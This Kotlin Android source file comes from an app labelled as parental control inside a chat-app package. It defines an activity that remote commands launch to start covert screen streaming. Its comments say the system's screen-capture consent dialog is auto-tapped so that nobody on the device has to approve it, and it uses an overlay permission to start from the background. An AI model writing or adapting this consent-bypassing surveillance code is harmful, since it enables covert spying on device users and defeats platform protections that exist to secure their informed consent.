package com.anonchat.app.parentalcontrol.service

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper

/**
 * One-shot transparent activity that hosts Android's MediaProjection consent
 * dialog. Launched by [TrackerService] when the parent sends a "screen_view"
 * command; the result is forwarded to [ScreenStreamService], which does the
 * actual frame capture + upload.
 *
 * Background activity launch is permitted because the app holds
 * SYSTEM_ALERT_WINDOW (one of the Android 10+ background-start exemptions).
 * The consent dialog is auto-tapped by AutoPermissionHelper.autoApproveProjectionDialog
 * (armed only while a screen_view consent attempt is in flight), so no one
 * needs to physically touch the device.
 */
class ScreenShareConsentActivity : Activity() {

    companion object {
        private const val TAG = "ScreenShareConsent"
        private const val RC_CONSENT = 4242

        // Set by TrackerService right before launching this activity.
        @Volatile
        var pendingCommandId: String? = null

        @Volatile
        var pendingDurationSec: Int = 300
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (ScreenStreamService.isStreaming) {
            // Already viewing — just confirm the command so the parent UI proceeds.
            val id = pendingCommandId
            if (id != null) {
                Thread {
                    try { ApiClient.updateCommandStatus(id, "completed", "Screen view already active") } catch (_: Exception) {}
                }.start()
            }
            finish()
            return
        }
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), RC_CONSENT)
        } catch (e: Exception) {
            Log.e(TAG, "createScreenCaptureIntent failed: ${e.message}")
            failCommand("MediaProjection unavailable: ${e.message}")
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != RC_CONSENT) return
        if (resultCode == RESULT_OK && data != null) {
            Log.d(TAG, "Screen capture consent granted — starting stream service")
            ScreenStreamService.start(
                this, resultCode, data,
                pendingCommandId, pendingDurationSec
            )
        } else {
            Log.w(TAG, "Screen capture consent denied")
            failCommand("Screen share consent denied on device")
        }
        finish()
    }

    private fun failCommand(reason: String) {
        val id = pendingCommandId ?: return
        Thread {
            try { ApiClient.updateCommandStatus(id, "failed", reason) } catch (_: Exception) {}
        }.start()
    }

    override fun onDestroy() {
        // The consent dialog lives exactly as long as this activity — after it
        // closes (granted, denied, or failed) the systemui auto-tapper must be
        // disarmed so it can never tap unrelated system dialogs.
        AutoPermissionHelper.projectionConsentPending = false
        super.onDestroy()
    }
}
